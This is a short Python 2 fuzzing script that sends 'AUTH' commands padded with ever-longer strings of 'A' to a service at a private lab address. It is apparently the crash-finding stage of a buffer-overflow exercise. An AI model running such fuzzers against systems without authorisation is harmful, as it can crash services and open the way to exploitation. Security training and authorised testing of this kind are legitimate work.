
#!/usr/bin/python
import socket

host = "10.11.8.175"
port = 5555

buffer =["A"]
counter=700
while len(buffer) <= 100:
	buffer.append("A"*counter)
	counter+=100

for string in buffer:
	print "Fuzzing with %s bytes" % len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data=s.recv(1024)
	print data
	s.send("AUTH " + string)
	data=s.recv(1024)
	print data
	s.close()
